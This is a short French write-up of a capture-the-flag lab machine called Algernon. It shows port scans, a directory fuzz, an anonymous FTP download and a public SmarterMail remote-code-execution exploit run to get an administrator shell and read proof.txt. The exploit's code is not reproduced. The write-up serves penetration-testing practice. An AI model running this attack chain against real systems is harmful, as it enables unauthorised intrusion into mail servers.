
# Algernon

	sudo  masscan  -p1-65535,U:1-65535 192.168.212.65 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.212.65
	ffuf -u http://192.168.212.65/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -e .php,.txt,.ini,.conf,.log -fc 403
	
Scans classiques. J'ai opté pour FFUF parce que Feroxbuster donnait des résultats étranges avec plein de faux-positifs.

    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           Microsoft ftpd
    80/tcp    open  http          Microsoft IIS httpd 10.0
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds?
    9998/tcp  open  http          Microsoft IIS httpd 10.0
    17001/tcp open  remoting      MS .NET Remoting services

Rien sur le premier site web mais le partage FTP semble ouvert aux connexions anonymes. J'ai trouvé une bonne manière de télécharger tout le contenu d'un serveur FTP directement : 

    wget -r ftp://anonymous:""@192.168.212.65/

Rien de bien intéressant quand on fouille. Il n'y a que deux fichiers de logs contenant des informations sur la mise à jour d'une base de données ClamAV et sur une tâche planifiée quotidienne.

En revanche le deuxième service web du port 9998 amène à une page intéressante : http://192.168.212.65:9998/interface/root#/login

Je n'ai pas réussi à trouver la version exacte du CMS mais en ne cherchant que le nom sur Exploit-DB on tombe sur une liste qui n'est pas si grande : https://www.exploit-db.com/search?q=smartermail

J'ai commencé par tester la seule RCE du lot, puisque la plupart des VM faciles ont souvent ce pattern, et c'est passé : 

    vim exploit_SmarterMail.py
    python3 ~/000_exploits/exploit_SmarterMail.py 
    PS C:\Windows\system32> whoami
    PS C:\Windows\system32>	type C:\Users\Administrator\Desktop\proof.txt







